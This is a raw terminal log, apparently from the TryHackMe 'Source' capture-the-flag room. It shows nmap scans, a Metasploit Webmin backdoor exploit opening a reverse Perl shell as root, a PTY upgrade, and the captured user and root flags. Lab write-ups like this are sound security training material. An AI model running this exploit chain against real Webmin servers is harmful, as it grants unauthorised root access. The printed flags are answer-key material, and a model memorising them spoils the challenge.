@@ -1,0 +1,132 @@
+nmap -sSVC -Pn -vv 10.10.105.231
+.....
+PORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbZAxRhWUij6g6MP11OkGSk7vYHRNyQcTIdMmjj1kSvDhyuXS9QbM5t2qe3UMblyLaObwKJDN++KWfzl1+beOrq3sXkTA4Wot1RyYo0hPdQT0GWBTs63dll2+c4yv3nDiYAwtSsPLCeynPEmSUGDjkVnP12gxXe/qCsM2+rZ9tzXtSWiXgWvaxMZiHaQpT1KaY0z6ebzBTI8siU0t+6SMK7rNv1CsUNpGeicfbC5ZOE4/Nbc8cxNl7gDtZbyjdh9S7KTvzkSj2zBJ+8VbzsuZk1yy8uyLDgmuBQ6LzbYUNHkTQhJetVq7utFpRqLdpSJTcsz5PAxd1Upe9DqoYURuL
+|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEYCha8jk+VzcJRRwV41rl8EuJBiy7Cf8xg6tX41bZv0huZdCcCTCq9dLJlzO2V9s+sMp92TpzR5j8NAAuJt0DA=
+|   256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJnY5oycmgw6ND6Mw4y0YQWZiHoKhePo4bylKKCP0E5
+10000/tcp open  http    syn-ack ttl 61 MiniServ 1.890 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: EDEDEF8689A7841675FD97449ACA3765
+|_  Supported Methods: HEAD
+|_http-server-header: MiniServ/1.890
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+PS C:\Users\gd\Downloads\Androidhack\Android Debug Bridge (ADB)> nmap --script=vuln -Pn 10.10.105.231
+....
+22/tcp    open  ssh
+10000/tcp open  snet-sensor-mgmt
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+| http-vuln-cve2006-3392:
+|   VULNERABLE:
+|   Webmin File Disclosure
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2006-3392
+|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
+|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
+|       to bypass the removal of "../" directory traversal sequences.
+|
+|     Disclosure date: 2006-06-29
+|     References:
+|       http://www.exploit-db.com/exploits/1997/
+|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
+|_sslv2-drown:
+
+Nmap done: 1 IP address (1 host up) scanned in 33.54 seconds
+
+msf6 > search webmin
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/linux/http/webmin_backdoor
+
+msf6 > use 5
+[*] Using configured payload cmd/unix/reverse_perl
+msf6 exploit(linux/http/webmin_backdoor) > show options
+
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the loca
+                                         l machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+msf6 exploit(linux/http/webmin_backdoor) > set lhost 10.6.88.227
+lhost => 10.6.88.227
+msf6 exploit(linux/http/webmin_backdoor) > set ssl true
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => true
+msf6 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.105.231
+rhosts => 10.10.105.231
+msf6 exploit(linux/http/webmin_backdoor) > set rport 10000
+rport => 10000
+msf6 exploit(linux/http/webmin_backdoor) > run
+
+[*] Started reverse TCP handler on 10.6.88.227:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 1 opened (10.6.88.227:4444 -> 10.10.105.231:39428) at 2021-08-11 22:58:25 +0700
+
+which python
+/usr/bin/python
+python -c "import pty;pty.spawn('/bin/bash')"
+root@source:/usr/share/webmin/# find / -name user.txt 2>/dev/null
+find / -name user.txt 2>/dev/null
+/home/dark/user.txt
+root@source:/usr/share/webmin/# cat /home/dark/user.txt
+cat /home/dark/user.txt
+THM{SUPPLY_CHAIN_COMPROMISE}
+root@source:/usr/share/webmin/# find / -name root.txt 2>/dev/null
+find / -name root.txt 2>/dev/null
+/root/root.txt
+root@source:/usr/share/webmin/# cat /root/root.txt
+cat /root/root.txt
+THM{UPDATE_YOUR_INSTALL}
+
+
+https://tryhackme.com/room/source
+
+https://hacklido.com/u/EMPHAY
